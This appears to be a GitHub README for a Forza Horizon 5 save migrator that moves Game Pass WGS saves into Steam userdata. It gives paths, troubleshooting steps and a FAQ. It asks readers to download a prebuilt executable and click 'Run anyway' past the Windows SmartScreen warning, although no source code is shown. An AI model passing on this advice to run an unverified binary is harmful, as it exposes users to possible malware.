<p align="center">
  <img src="https://i.postimg.cc/9FGcVRLH/banner.png" alt="Forza Horizon 5 Save Migrator — Convert PC Game Pass (WGS) Saves to Steam" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GamePass%20%E2%86%94%20Steam-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-fh5--wgs--migrator--v1.2-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Forza Horizon 5 Save Migrator — Convert PC Game Pass (WGS) Saves to Steam

**Built a massive 800-car garage in Forza Horizon 5 on PC Game Pass and bought the Steam version? Forza Horizon 5 lacks official cross-save between Microsoft Store and Steam, hiding saves inside hashed WGS containers. Unpack and migrate your profile cleanly.**

Forza Horizon 5 Save Migrator bridges Microsoft Store / Xbox App and Steam `userdata` on Windows: **parsing `container.index` inside `%LOCALAPPDATA%\Packages\Microsoft.624F8B84B80_*\SystemAppData\wgs\` and mapping extracted `ProfileData` files into Steam's `userdata\<SteamID>\1551360\remote` directory**.

This project is aimed at **Forza Horizon 5 on Windows 10/11 PC** for migrating existing single-player / profile progress between Microsoft Store / PC Game Pass and Steam.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Signing into the same Xbox account on Steam FH5 starts a brand-new save | Forza Horizon 5 does not sync saves between Microsoft Store and Steam | Extract `wgs` profile payloads into `Steam\userdata\<ID>\1551360\remote` |
| Cannot find a 'ForzaHorizon5' folder in `AppData\Local\Packages` | Microsoft Store packages FH5 under package ID `Microsoft.624F8B84B80_8wekyb3d8bbwe` | Auto-detect `Microsoft.624F8B84B80_*\SystemAppData\wgs` automatically |
| Steam Cloud overwrites migrated `ProfileData` on launch | Steam Cloud syncs a fresh starter profile on first boot | Run Steam FH5 once first, disable Steam Cloud briefly, copy & re-enable |
| Protecting both your Game Pass and Steam profiles | Improper copy without backups risks losing local profile blobs | Create dated `.zip` backups of both `wgs` and `1551360\remote` first |

## Download for Windows

[**Download ForzaHorizon5Save.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/ForzaHorizon5Save.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `ForzaHorizon5Save.exe`? (Key features)

- Auto-detects `%LOCALAPPDATA%\Packages\Microsoft.624F8B84B80_*\SystemAppData\wgs` without hunting package hashes.
- Decodes `container.index` to recover exact `ProfileData` and `User_*` save blobs.
- Locates your active `Steam\userdata\<SteamID>\1551360\remote` folder automatically.
- Creates dated backups of both folders and leaves your original Game Pass save untouched.

### Sample Output

```text
[ForzaHorizon5Save] Scanning Microsoft.624F8B84B80 WGS & Steam AppID 1551360...
[OK]   Game Pass WGS    : C:\Users\Player\AppData\Local\Packages\Microsoft.624F8B84B80_8wekyb3d8bbwe\SystemAppData\wgs
[OK]   Decoded Profile  : User_ProfileData + 4 save containers (24.6 MB)
[OK]   Backup Created   : Documents\FH5-SaveBackup\2026-11-23\
[OK]   Steam Target     : C:\Program Files (x86)\Steam\userdata\41299104\1551360\remote
```

The release ZIP is named `ForzaHorizon5Save.zip`; the Windows executable inside is named `ForzaHorizon5Save.exe`.

1. Close Forza Horizon 5 Save Migrator before updating or replacing executable files.
2. Click **Download ForzaHorizon5Save.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `ForzaHorizon5Save.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with PC Game Pass / Microsoft Store and Steam versions of Forza Horizon 5 installed.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `ForzaHorizon5Save.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### No official cross-save between PC Game Pass and Steam in FH5

Bridges the save format gap so you don't lose hundreds of hours of cars, credits, and Festival Playlist progress.

### Cryptic `Microsoft.624F8B84B80` UWP package name

Finds the exact Xbox App container path automatically.

### Steam `userdata\<SteamID>\1551360\remote` mapping

Places unpacked blobs in the exact directory expected by the Steam executable.

### Full backups before writing

Protects both platforms with timestamped snapshots.

## Default folders and configuration paths

Forza Horizon 5 stores PC Game Pass and Steam saves across `%LOCALAPPDATA%` and `Steam\userdata`:

```text
%LOCALAPPDATA%\Packages\Microsoft.624F8B84B80_8wekyb3d8bbwe\SystemAppData\wgs\
```

Typical directory layout:

```text
Xbox Game Pass (Source):
%LOCALAPPDATA%\Packages\Microsoft.624F8B84B80_8wekyb3d8bbwe\SystemAppData\wgs\<XUID>\
├── container.index
└── <ContainerGUID>\<HexBlobs>

Steam Edition (Target):
%ProgramFiles(x86)%\Steam\userdata\<SteamID>\1551360\remote\
```

Launch Steam Forza Horizon 5 once past the intro drive so Steam generates `userdata\<SteamID>\1551360\remote` before running the migrator.

## Quick start guide

Follow these steps to get started:

1. **Close Forza Horizon 5 on both Xbox App and Steam.** Wait for Xbox cloud sync to finish.
2. **Launch Steam Forza Horizon 5 once to create `userdata\<SteamID>\1551360\remote`, then exit.** Temporarily disable Steam Cloud for FH5 if prompted on next launch.
3. **Extract `ForzaHorizon5Save.zip` and run `ForzaHorizon5Save.exe`.** Backs up both folders and unpacks your save into Steam.
4. **Launch Steam FH5, choose **Local Save** if Steam Cloud asks, and complete an event to save.** Re-enable Steam Cloud afterward.

### Data safety note

Never alter files inside `SystemAppData\wgs\`; work strictly from extracted copies.

## What the status summary shows

Forza Horizon 5 Save Migrator displays **detected `Microsoft.624F8B84B80` path, extracted profile blobs, backup location, and target Steam `1551360\remote` path**.

## FAQ

**Why doesn't signing into my Xbox Live account on Steam Forza Horizon 5 automatically load my Game Pass save?**

Forza Horizon 5 treats Microsoft Store and Steam as separate save ecosystems and does not sync profile files over the cloud between them.

**Does this delete my Xbox Game Pass save?**

No. Your `wgs` folder is read-only and remains completely untouched.

**What if Steam asks whether to use Local Save or Cloud Save?**

Always pick **Local Save** after migrating so Steam uploads your transferred profile to Steam Cloud.

## Useful reading

- [Forza Horizon 5 on Steam](https://store.steampowered.com/app/1551360/Forza_Horizon_5/)

## More Windows Gaming Utilities

- [IndianaJones-GamePassSaveBridge](../IndianaJones-GamePassSaveBridge) — Indiana Jones and the Great Circle Game Pass ↔ Steam save bridge
- [Expedition33-GamePassSaveBridge](../Expedition33-GamePassSaveBridge) — Clair Obscur: Expedition 33 Game Pass ↔ Steam save bridge
- [OblivionRemaster-WGSSaveConverter](../OblivionRemaster-WGSSaveConverter) — Oblivion Remastered Game Pass (`wgs`) ↔ Steam save converter
- [CloudSave-UniversalGameSync](../CloudSave-UniversalGameSync) — Automatic save folder synchronizer for non-Steam Cloud games

*Independent community project. Not affiliated with Playground Games, Turn 10 Studios, Xbox Game Studios, Microsoft, Valve, or Steam.*
